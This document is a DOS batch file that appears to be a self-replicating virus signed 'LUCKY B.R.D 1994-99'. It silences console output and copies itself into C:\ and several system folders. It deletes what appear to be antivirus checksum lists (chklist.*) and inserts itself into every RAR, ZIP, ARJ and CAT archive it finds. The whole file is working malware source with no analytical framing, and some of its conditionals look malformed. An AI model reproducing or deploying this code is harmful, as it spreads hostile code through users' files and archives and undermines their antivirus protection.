@echo off
if "%1=="#r goto rar
if "%1=="#z goto zip
if "%1=="#a goto arj
if "%1=="#c goto cat
ctty nul
copy %0 c:\dos\%0
copy %0 c:\windows\%0
copy %0 c:\win98\%0
copy %0 C:\win95\%0
copy %0 c:\%0
copy %0 ..\%0
del chklist.*
ctty con
for %%r in (*.rar) do call %0 #r %%r
for %%z in (*.zip) do call %0 #z %%z
for %%a in (*.arj) do call %0 #a %%a
for %%c in (*.cat) do call %0 #c %%c
goto end
:rar
attrib -r %2
rar a -tk -y -c- -o+ %2 %0 >nul
goto end
:zip
attrib -r %2
pkzip %2 %0 >nul
goto end
:arj
attrib -r %2
arj a %2 %0 >nul
:cat
attrib -r %2
cat -la -1 -Pk -C LUCKY >nul
:end
rem from LUCKY B.R.D 1994-99    Yes,,,,so what so think
echo on
